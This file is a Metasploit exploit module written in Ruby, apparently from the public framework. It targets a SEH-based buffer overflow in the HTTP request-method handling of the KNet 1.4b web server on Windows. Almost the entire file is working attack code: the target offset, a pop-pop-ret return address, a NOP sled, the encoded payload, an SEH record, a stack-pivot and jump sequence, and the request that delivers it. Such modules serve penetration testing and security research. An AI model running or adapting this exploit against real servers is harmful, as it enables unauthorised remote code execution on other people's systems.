##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'KNet 1.4b HTTP Method Buffer Overflow',
      'Description'    => %q{
        This module exploits a SEH buffer overflow vulnerability
        in the KNet web server 1.4b
        caused by improper bounds checking of the request method. This
        module has been tested successfully on Windows 10 Pro 1709.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Werebug',
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread'
        },
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars'   => "\x00\x0d\x20\x2e\x2f",
        },
      'Targets'        =>
        [
          [ 'KNet 1.4b',
            {
              'Offset' => 1240,
              'Ret'    => 0x10016190  # pop pop ret in libspp.dll
            }
          ],
        ],
      'Privileged'     => true,
      'DefaultTarget'  => 0))
  end

  def exploit
    
    method = "\x41" * 12
    method << "\x90" * 32
    method << payload.encoded
    method << "A" * (target['Offset'] - method.length - 4)
    method << generate_seh_record(target['Ret'])
    method << "\x66\x81\xc4\x08\x07" # add sp, 0x708
    method << "\xff\xe4" # jmp esp
    method << "C" * (2000 - method.length)
        
    send_request_cgi(
        'method' => method,
        'uri'    => '/',
    )
  end
end
